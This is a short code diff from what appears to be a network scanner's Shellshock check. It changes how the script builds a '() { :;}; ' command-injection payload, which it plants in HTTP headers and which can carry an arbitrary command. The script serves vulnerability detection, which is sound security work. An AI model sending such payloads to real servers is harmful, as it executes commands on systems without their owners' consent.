@@ -87,7 +87,7 @@ function generate_http_req(host, port, uri, custom_header, cmd)
     cmd = '() { :;}; '..cmd
  else
     rnd = rand.random_alpha(15)
-    cmd = '() { :;}; echo; echo "'..rnd..'"'
+    cmd = '() { :;}; echo; echo -n '..rnd:sub(1, 1)..'; echo '..rnd:sub(2)..''
   end
   -- Plant the payload in the HTTP headers
   local options = {header={}}
